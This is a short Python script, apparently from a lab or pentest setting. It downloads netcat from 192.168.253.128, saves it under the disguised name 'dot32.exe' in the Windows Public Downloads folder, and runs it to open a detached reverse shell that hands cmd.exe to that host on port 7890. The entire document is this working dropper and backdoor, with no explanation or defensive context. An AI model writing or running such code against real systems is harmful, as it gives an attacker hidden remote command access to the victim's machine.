import os
import wget

wget.download("http://192.168.253.128/nc.exe","C:\\Users\\Public\\Downloads\\dot32.exe")
os.system("C:\\Users\\Public\\Downloads\\dot32.exe -e cmd.exe -d 192.168.253.128 7890")

